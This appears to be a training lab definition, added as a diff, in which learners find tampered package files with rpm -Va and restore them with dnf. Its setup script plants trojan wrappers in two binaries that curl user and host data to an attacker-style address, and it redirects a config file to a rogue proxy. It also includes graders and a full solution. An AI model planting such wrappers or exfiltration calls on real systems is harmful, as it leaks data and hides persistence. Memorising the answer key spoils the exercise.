@@ -1,0 +1,161 @@
+apiVersion: cloudtrain.dev/v3
+kind: Lab
+metadata:
+  id: rpm-verify-tampered
+  title: Find which package files were modified
+  domain: linux
+  frameworks: [rhcsa-aligned:software, linuxplus:security]
+  difficulty: medium
+  estimatedMinutes: 15
+  tags: [rpm, dnf, integrity, incident-response, sudo]
+  version: 1
+spec:
+  description: |
+    The intrusion detection on the ticket web host `tkt-web-02` flagged outbound
+    connections made from system binaries. Someone with root access changed files
+    that belong to installed packages.
+
+    At commissioning, the security team saved the output of `rpm -Va` (the files that
+    already differed from their packages then, by design) in
+    **`/srv/audit/rpm-Va-commissioning.txt`**. With `sudo`:
+
+    1. Find the files owned by packages that were changed **since commissioning**:
+       **two binaries and one configuration file**. Write their full paths to
+       **`~/audit/tampered.txt`**, one per line (order does not matter, nothing else
+       in the file).
+    2. **Restore the two binaries** by reinstalling the packages they belong to from
+       the configured repository. Leave the configuration file as it is for the
+       forensics team.
+  objectives:
+    - Verify installed packages against the RPM database
+    - Read rpm -V flags and compare against a baseline
+    - Restore package files with dnf reinstall
+  params:
+    bin1:
+      type: choice
+      values: [tree, lsof, zip]
+    bin2:
+      type: choice
+      values: [which, bc, unzip]
+    conf:
+      type: choice
+      values: [/etc/wgetrc, /etc/nanorc]
+  topology:
+    entry: tkt-web-02
+    nodes:
+      - name: tkt-web-02
+        driver: container
+        image: el-lab:10
+        learnerSudo: true
+        access: [shell]
+  setup:
+    - on: tkt-web-02
+      timeoutSec: 300
+      run: |
+        set -eu
+        echo 'learner ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/learner
+        chmod 0440 /etc/sudoers.d/learner
+        mkdir -p /srv/audit /var/lib/cloudtrain /usr/lib64/.tr-cache
+        chmod 0700 /var/lib/cloudtrain
+        rpm -Va > /srv/audit/rpm-Va-commissioning.txt 2>/dev/null || true
+        chmod 0644 /srv/audit/rpm-Va-commissioning.txt
+        for b in {{bin1}} {{bin2}}; do
+          mv /usr/bin/$b /usr/lib64/.tr-cache/.$b
+          printf '%s\n' '#!/bin/sh' '# local patch' "/usr/bin/curl -fsS -m 1 -d \"\$(id -un)@\$(hostname)\" http://10.66.6.6:8080/c >/dev/null 2>&1 &" "exec /usr/lib64/.tr-cache/.$b \"\$@\"" > /usr/bin/$b
+          chmod 0755 /usr/bin/$b
+        done
+        printf '%s\n' '' '# proxy for updates' 'use_proxy = on' 'http_proxy = http://10.66.6.6:3128/' 'https_proxy = http://10.66.6.6:3128/' >> {{conf}}
+        printf '%s\n' /usr/bin/{{bin1}} /usr/bin/{{bin2}} {{conf}} | sort > /var/lib/cloudtrain/tampered.expected
+        install -d -o learner -g learner /home/learner/audit
+        rm -f /home/learner/audit/tampered.txt
+  checks:
+    - id: report
+      description: ~/audit/tampered.txt lists exactly the three files changed since commissioning
+      type: shell
+      on: tkt-web-02
+      skills: [linux.security.integrity]
+      weight: 2
+      command: |
+        f=/home/learner/audit/tampered.txt
+        [ -s $f ] || { echo missing; exit 0; }
+        sed 's/^[[:space:]]*//; s/[[:space:]]*$//' $f | grep -v '^$' | sort -u | cmp -s - /var/lib/cloudtrain/tampered.expected && echo exact || echo wrong
+      expect: {match: exact, value: exact}
+    - id: binaries-restored
+      description: Both binaries match their packages again
+      type: shell
+      on: tkt-web-02
+      skills: [linux.packages.dnf, linux.security.integrity]
+      weight: 2
+      timeoutSec: 60
+      command: |
+        n=0
+        for b in {{bin1}} {{bin2}}; do
+          p=/usr/bin/$b
+          [ "$(head -c 4 $p 2>/dev/null | od -An -c | tr -d ' ')" = '177ELF' ] || continue
+          rpm -Vf $p 2>/dev/null | grep -q " $p\$" || n=$((n+1))
+        done
+        echo $n
+      expect: {match: exact, value: "2"}
+    - id: config-preserved
+      description: The tampered configuration file is left for forensics
+      type: shell
+      on: tkt-web-02
+      skills: [linux.security.integrity]
+      weight: 0.5
+      command: grep -q '^http_proxy = http://10.66.6.6:3128/' {{conf}} && echo kept || echo changed
+      expect: {match: exact, value: kept}
+  hints:
+    - title: Verify everything
+      body: "`sudo rpm -Va` checks every installed file against the RPM database. Each output line has flags (S size, 5 digest, T mtime, M mode...), an optional `c` for config files, and the path. It takes about 20 seconds."
+      cost: 0
+    - title: Compare with the baseline
+      body: "Save today's output and compare: `sudo rpm -Va > /tmp/now.txt; diff /srv/audit/rpm-Va-commissioning.txt /tmp/now.txt`. Lines starting with `>` are new."
+      cost: 1
+    - title: Which package?
+      body: "`rpm -qf /usr/bin/NAME` names the owning package; `sudo dnf -y reinstall PACKAGE` puts its files back. `rpm -Vf /usr/bin/NAME` prints nothing when the file is clean."
+      cost: 2
+  misconceptions:
+    - id: includes-baseline-noise
+      description: Reports every rpm -Va line, including the differences from commissioning.
+      feedback: "Some files differed by design at commissioning (they are in the baseline). Only the lines that are new since then are the attack."
+      expectFail: [report]
+      mutation:
+        on: tkt-web-02
+        as: learner
+        run: |
+          sudo rpm -Va 2>/dev/null | grep -E '^[S.]{1}[.M]?.*5' | awk '{print $NF}' > ~/audit/tampered.txt
+          sudo dnf -y -q reinstall $(rpm -qf --qf '%{NAME}\n' /usr/bin/{{bin1}} /usr/bin/{{bin2}}) >/dev/null
+    - id: copies-back
+      description: Copies the attacker's saved originals back instead of reinstalling.
+      feedback: "You cannot trust anything the attacker left behind, and the copy does not match the package metadata (rpm -V still flags it). Reinstall the packages from the repository."
+      expectFail: [binaries-restored]
+      mutation:
+        on: tkt-web-02
+        as: learner
+        run: |
+          printf '%s\n' /usr/bin/{{bin1}} /usr/bin/{{bin2}} {{conf}} > ~/audit/tampered.txt
+          for b in {{bin1}} {{bin2}}; do sudo cp /usr/lib64/.tr-cache/.$b /usr/bin/$b; done
+    - id: reverts-config
+      description: Also reinstalls the configuration file's package to clean it.
+      feedback: "dnf reinstall keeps a modified %config(noreplace) file or saves it aside; either way, the task was to leave the evidence in place. Only the binaries were to be restored."
+      expectFail: [config-preserved]
+      mutation:
+        on: tkt-web-02
+        as: learner
+        run: |
+          printf '%s\n' /usr/bin/{{bin1}} /usr/bin/{{bin2}} {{conf}} > ~/audit/tampered.txt
+          sudo dnf -y -q reinstall $(rpm -qf --qf '%{NAME}\n' /usr/bin/{{bin1}} /usr/bin/{{bin2}}) >/dev/null
+          sudo sed -i '/10.66.6.6/d' {{conf}}
+  solution:
+    explanation: Diff a fresh rpm -Va against the commissioning baseline, report the new paths, and dnf reinstall the packages that own the two binaries.
+    steps:
+      - on: tkt-web-02
+        as: learner
+        timeoutSec: 400
+        run: |
+          set -e
+          sudo rpm -Va > /tmp/now.txt 2>/dev/null || true
+          grep -vxF -f /srv/audit/rpm-Va-commissioning.txt /tmp/now.txt | awk '{print $NF}' > ~/audit/tampered.txt
+          cat ~/audit/tampered.txt
+          pkgs=$(grep '^/usr/bin/' ~/audit/tampered.txt | xargs rpm -qf --qf '%{NAME}\n')
+          sudo dnf -y reinstall $pkgs
